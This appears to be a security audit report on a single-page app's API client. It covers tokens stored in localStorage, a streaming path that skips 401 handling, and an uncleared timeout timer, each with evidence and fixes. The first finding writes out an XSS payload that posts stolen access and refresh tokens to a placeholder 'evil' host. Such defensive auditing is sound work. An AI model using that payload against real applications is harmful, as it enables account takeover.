# Frontend (SPA / API Client)

_3 finding(s) in this dimension._

Findings in the SPA / API client: JWTs stored in `localStorage` (XSS exfiltration risk), the SSE `stream()` path bypassing 401 handling, and a `setTimeout`-driven `AbortController` timer that was never cleared (leak). Fixed (mitigated) by adding a strict CSP via nginx, routing `stream()` 401s through the auth-failed path, and clearing the timeout timer once the fetch settles. The full httpOnly-cookie migration is tracked as Phase 2.

---

### `token-localstorage-xss-theft`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | auth |
| Location | `frontend/src/services/apiClient.js:17` |
| Status | **Mitigated (CSP) - Phase 2 tracked in SUMMARY.md** |

**Summary.** Both the access token (athena_token) and the long-lived refresh token (athena_refresh) are persisted in localStorage, so any XSS anywhere in the app can exfiltrate them with localStorage.getItem() and silently maintain access via the refresh token.

**Failure scenario.** A single stored-XSS or supply-chain XSS payload runs `fetch('//evil/',{method:'POST',body:JSON.stringify({a:localStorage.getItem('athena_token'),r:localStorage.getItem('athena_refresh')})})`. Attacker obtains a valid bearer token and a long-lived refresh token, fully taking over the account from another origin/tab.

**Evidence.** function getToken() { return localStorage.getItem('athena_token'); }\nexport function setRefreshToken(token) { if (token) localStorage.setItem('athena_refresh', token); ... }

**Suggested fix.** Move token custody to an HttpOnly+SameSite=Strict (or Lax) cookie set by the backend on /auth/login-json and /auth/refresh, and have the API read it via cookie-auth (with CSRF tokens) instead of an Authorization header. If bearer tokens must remain, at minimum drop the refresh token from JS-visible storage (HttpOnly cookie) and keep only a short-lived access token in memory (not localStorage).

**Verification rationale.** Confirmed in the actual code. apiClient.js:16-18 stores the access JWT (athena_token) in localStorage and reads it via getToken(); apiClient.js:26-29 and 36-38 store/read the refresh token (athena_refresh) in localStorage. authService.js:21-27 confirms athena_refresh is a long-lived refresh token used to mint new access tokens by POSTing it to /auth/refresh. localStorage is fully JS-readable, so any XSS payload in the SPA can exfiltrate both tokens with localStorage.getItem and sustain account takeover via the refresh token. The file path, line 17, evidence, and failure scenario in the finding all match the real code. No mitigating control (HttpOnly cookie, in-memory-only token, CSP that blocks exfil) is present in the read files.

**Notes.** File/line exact: frontend/src/services/apiClient.js line 17 (getToken), with supporting storage of the refresh token at lines 27 and 37. Corroborating long-lived-refresh-token logic at frontend/src/services/authService.js:21-27. Suggested fix is sound.


---

### `stream-bypasses-401-handling`

| Field | Value |
|---|---|
| Severity | **MEDIUM** |
| Confidence | high |
| Category | auth |
| Location | `frontend/src/services/apiClient.js:197` |
| Status | **Fixed** |

**Summary.** The streaming POST path performs a raw fetch and never calls _handle401, so a 401 mid-stream only surfaces a generic stream_error and does not clear tokens or dispatch athena:auth-failed.

**Failure scenario.** User's JWT expires while a chat is open. They click Send; /chat/stream returns 401. useChatStream sets error='stream_error: 401' but athena_token remains in localStorage and AuthBoundary never fires, so the UI keeps showing the user as logged in and every subsequent request retries with the dead token until a non-stream call finally 401s.

**Evidence.** stream(path, body, opts = {}) {\n const headers = { 'Content-Type': 'application/json', ...(opts.headers \|\| {}) };\n const token = getToken();\n if (token) headers.Authorization = `Bearer ${token}`;\n return fetch(`${BASE}${path}`, { method: 'POST', body: JSON.stringify(body), headers, signal: opts.signal });\n}

**Suggested fix.** In useChatStream (or in apiClient.stream), branch on `resp.status === 401` before treating the response as a stream: call the same _handle401('stream') path, clearTokens(), dispatch AUTH_EVENT, and abort. Reuse the central 401 handler so stream and non-stream paths stay consistent.

**Verification rationale.** Verified in Y:\AI_Projects\project-athena\frontend\src\services\apiClient.js and frontend\src\hooks\useChatStream.js. apiClient.stream() (lines 197-207) does a raw fetch and returns the Response directly, with no branch on res.status === 401 and no call to _handle401. The central request() function (lines 135-140) and upload() (lines 181-184) both invoke _handle401('request'\|'upload') on 401, which calls clearTokens() and dispatches the AUTH_EVENT. The streaming path does not. In useChatStream.send, on the non-ok branch (lines 99-105) the code only does setError(`stream_error: ${resp.status}`), setDone(true), and cleanup of refs " it never inspects resp.status === 401, never calls clearTokens(), and never dispatches athena:auth-failed. So a 401 on /chat/stream leaves athena_token in localStorage, AuthBoundary (which listens for AUTH_EVENT) never fires, the UI keeps showing the user as logged in, and subsequent requests keep using the dead token until a non-stream call finally triggers _handle401. The failure scenario reproduces exactly as described. Severity medium is appropriate: it is an auth-handling inconsistency causing stale session state and poor UX (user appears logged in, retries silently fail), but it does not grant unauthorized access " the dead token is rejected by the backend, and the next non-stream request clears it.

**Notes.** Line 197 is correct " that is where the stream() method begins. The suggested fix is sound: in useChatStream's non-ok branch (or in apiClient.stream before returning), check resp.status === 401 and route to _handle401('stream') / clearTokens() / AUTH_EVENT dispatch so the streaming path mirrors request() and upload(). Note _handle401 is module-private (not exported), so the cleanest fix is to either export a helper from apiClient or add the 401 branch inside stream() itself before returning the Response.


---

### `timeout-signal-timer-leak`

| Field | Value |
|---|---|
| Severity | **LOW** |
| Confidence | high |
| Category | dos |
| Location | `frontend/src/services/apiClient.js:99` |
| Status | **Fixed** |

**Summary.** Each request creates an AbortController plus a 30s setTimeout that is not cancelled when the fetch settles, so the timer and controller linger until expiry even after success.

**Failure scenario.** DocumentManager polls every 2-15s and the chat list re-fetches frequently; each completed call leaves a 30s orphan timer plus a retained AbortController and closure over opts/headers (incl. the Authorization header). On a long-lived tab this accumulates thousands of live timers holding token-bearing closures, increasing memory and GC pressure.

**Evidence.** function _timeoutSignal(ms) {\n const ctrl = new AbortController();\n setTimeout(() => ctrl.abort(), ms);\n return ctrl.signal;\n}

**Suggested fix.** Return both the controller and a cancel fn, or wrap the timer in a helper that the request path clears in a finally block: `const id = setTimeout(...); ... finally { clearTimeout(id); }`. Alternatively, use AbortSignal.timeout(ms) where supported and abort-with-reason on completion.

**Verification rationale.** Confirmed in apiClient.js lines 99-103: _timeoutSignal creates `setTimeout(() => ctrl.abort(), ms)` and returns only ctrl.signal, discarding the timer id, so it is never cleared. request() (line 116) and upload() (line 164) consume the signal in fetch but have no finally/clearTimeout, so the 30s timer (5min for uploads) lingers per request until it fires. DocumentManager.jsx line 62 confirms polling cadence (POLL_FAST_MS/POLL_SLOW_MS), so on a long-lived tab these dangling timers accumulate. The defect is genuine and the suggested fix (clearTimeout in finally, or AbortSignal.timeout) is valid. Caveat: the failure_scenario's claim that the closure retains opts/headers/Authorization is inaccurate " the timer callback only closes over `ctrl` and `ms`, not the request locals, so the retained payload is just the AbortController+signal, not the token. This narrows the memory impact but does not refute the dangling-timer bug.

**Notes.** Line 99-103 is correct. The closure retains the AbortController/signal only, NOT opts/headers/Authorization as the evidence claims " that part of the failure scenario is wrong, but the core dangling-timer defect stands. Severity low is appropriate.


---
